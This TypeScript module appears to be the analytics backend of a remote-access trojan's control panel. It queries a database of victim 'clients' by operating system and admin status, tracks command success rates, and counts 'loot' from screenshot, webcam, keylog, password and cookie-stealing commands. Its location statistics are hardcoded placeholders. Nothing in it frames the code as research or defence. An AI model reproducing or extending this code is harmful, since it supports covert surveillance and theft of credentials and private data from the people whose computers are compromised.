import { getDatabase } from './db'

export function getAnalytics() {
    console.log('[Analytics] CWD:', process.cwd())
    const db = getDatabase()
    
    try {
        const columns = db.prepare("PRAGMA table_info(clients)").all()
        console.log('[Analytics] Client columns:', columns.map((c: any) => c.name).join(', '))
    } catch (e) {
        console.error('[Analytics] Error checking columns:', e)
    }

    // Total Clients
    const totalClients = db.prepare('SELECT COUNT(*) as count FROM clients').get()?.count || 0
    
    // Commands Success Rate
    const cmdStats = db.prepare(`
        SELECT 
            SUM(CASE WHEN status = 'completed' THEN 1 ELSE 0 END) as success,
            SUM(CASE WHEN status = 'failed' THEN 1 ELSE 0 END) as fail
        FROM commands
    `).get() || { success: 0, fail: 0 }
    
    // OS Distribution
    const osDist = db.prepare('SELECT os as name, COUNT(*) as value FROM clients GROUP BY os').all()
    
    // Top Locations (Simulated for now based on IP, ideally use GeoIP)
    const topLocations = [
        { name: 'United States', value: 45 },
        { name: 'Russia', value: 25 },
        { name: 'China', value: 15 },
        { name: 'Germany', value: 15 }
    ]

    // User Privileges
    const privileges = db.prepare(`
        SELECT 
            is_admin,
            COUNT(*) as count
        FROM clients
        GROUP BY is_admin
    `).all()

    const adminCount = privileges.find((p: any) => p.is_admin === 1)?.count || 0
    const totalCount = totalClients || 1
    const adminPercent = Math.round((adminCount / totalCount) * 100)

    // Activity trends (connections per hour in last 24h)
    const activityTrends = db.prepare(`
        SELECT 
            strftime('%H:00', created_at) as time,
            COUNT(*) as connections
        FROM commands
        WHERE created_at > datetime('now', '-24 hours')
        GROUP BY time
        ORDER BY time ASC
    `).all()
    
    // Loot distribution
    const lootDist = db.prepare(`
        SELECT 
            command_name as name,
            COUNT(*) as value
        FROM commands
        WHERE status = 'completed' AND command_name IN ('screenshot', 'webcam', 'keylog', 'passwords', 'cookies')
        GROUP BY command_name
    `).all()

    // Command stats by day (last 7 days)
    const cmdHistory = db.prepare(`
        SELECT 
            strftime('%Y-%m-%d', created_at) as date,
            SUM(CASE WHEN status = 'completed' THEN 1 ELSE 0 END) as success,
            SUM(CASE WHEN status = 'failed' THEN 1 ELSE 0 END) as fail
        FROM commands
        WHERE created_at > datetime('now', '-7 days')
        GROUP BY date
        ORDER BY date ASC
    `).all()

    return {
        totalClients,
        cmdStats,
        osDist,
        activityTrends,
        lootDist,
        cmdHistory,
        topLocations,
        privileges: {
            admin: adminPercent,
            standard: 100 - adminPercent
        },
        integrityScore: 92 // Logic for rank/integrity
    }
}
